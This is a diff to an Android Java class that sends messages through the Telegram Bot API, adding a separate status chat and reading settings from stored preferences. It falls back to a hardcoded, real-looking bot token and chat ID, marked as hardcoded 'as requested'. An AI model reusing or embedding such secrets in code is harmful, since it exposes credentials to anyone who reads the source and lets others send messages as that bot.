@@ -17,6 +17,7 @@ public class TelegramSender {
     private static final String PREFS_NAME = "TelegramPrefs";
     private static final String KEY_BOT_TOKEN = "bot_token";
     private static final String KEY_CHAT_ID = "chat_id";
+    private static final String KEY_STATUS_CHAT_ID = "status_chat_id";
     private static final String TAG = "TelegramSender";
 
     private final Context context;
@@ -26,41 +27,71 @@ public class TelegramSender {
         this.context = context;
     }
 
-    public void saveConfig(String token, String chatId) {
+    public void saveConfig(String token, String chatId, String statusChatId) {
         SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
         prefs.edit()
                 .putString(KEY_BOT_TOKEN, token)
                 .putString(KEY_CHAT_ID, chatId)
+                .putString(KEY_STATUS_CHAT_ID, statusChatId)
                 .apply();
+    }
+    
+    // Kept for backward compatibility
+    public void saveConfig(String token, String chatId) {
+        saveConfig(token, chatId, "");
     }
 
     public String getBotToken() {
+        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        String token = prefs.getString(KEY_BOT_TOKEN, "");
+        if (!token.isEmpty()) return token;
+        
         // Hardcoded Bot Token as requested
         return "7788531778:AAEYpieUirgdiGlFfy6dzAb1-2Azk5jw3Og"; 
     }
 
     public String getChatId() {
+        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        String chatId = prefs.getString(KEY_CHAT_ID, "");
+        if (!chatId.isEmpty()) return chatId;
+
         // Hardcoded Chat ID as requested
         return "-1003791881466"; 
     }
+    
+    public String getStatusChatId() {
+        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        String chatId = prefs.getString(KEY_STATUS_CHAT_ID, "");
+        if (!chatId.isEmpty()) return chatId;
+        
+        // Fallback to main Chat ID if not set
+        return getChatId();
+    }
 
     public void sendMessage(String message) {
+        sendMessageToChat(message, getChatId());
+    }
+    
+    public void sendStatusMessage(String message) {
+        sendMessageToChat(message, getStatusChatId());
+    }
+
+    private void sendMessageToChat(String message, String targetChatId) {
         if (message == null || message.isEmpty()) return;
 
         // Log to file first
-        CustomExceptionHandler.log(context, "Telegram Sending: " + message);
+        CustomExceptionHandler.log(context, "Telegram Sending to " + targetChatId + ": " + message);
 
         String token = getBotToken();
-        String chatId = getChatId();
 
-        if (token.isEmpty() || chatId.isEmpty()) {
+        if (token.isEmpty() || targetChatId.isEmpty()) {
             Log.e(TAG, "Bot token or Chat ID not set");
             return;
         }
 
         executor.execute(() -> {
             try {
-                String urlString = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode(message, "UTF-8");
+                String urlString = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + targetChatId + "&text=" + URLEncoder.encode(message, "UTF-8");
                 URL url = new URL(urlString);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("GET");
